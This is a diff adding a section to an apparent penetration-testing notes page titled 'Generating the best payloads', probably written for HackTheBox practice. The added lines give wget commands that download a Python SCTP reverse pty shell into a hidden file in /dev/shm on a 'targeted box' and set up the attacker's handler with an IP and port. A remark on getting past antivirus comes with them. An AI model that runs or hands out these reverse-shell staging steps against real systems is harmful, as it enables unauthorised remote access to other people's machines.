@@ -3,6 +3,20 @@ layout: default
 title: Generating the best payloads
 ---
 
+Python
+======
+A very easy way to established our connection is to drop this pty shell to the targeted box:
+{% highlight bash%}
+wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_backconnect.py -o /dev/shm/.shell.py
+{% endhighlight %}
+configure the shell with the correct IP and port then get the shell handler
+{% highlight bash%}
+wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_shell_handler.py -o /root/HTB/handler.py
+python handler.py -b YourIP:Youropenedport
+{% endhighlight %}
+<sup>Shell scripts from [infodox][link11]</sup>
+
+Unfortunately, and as very many Metasploit payloads generated through MSFvenom, those are easily picked up by anti-virus nowadays.
 
 Veil
 =============
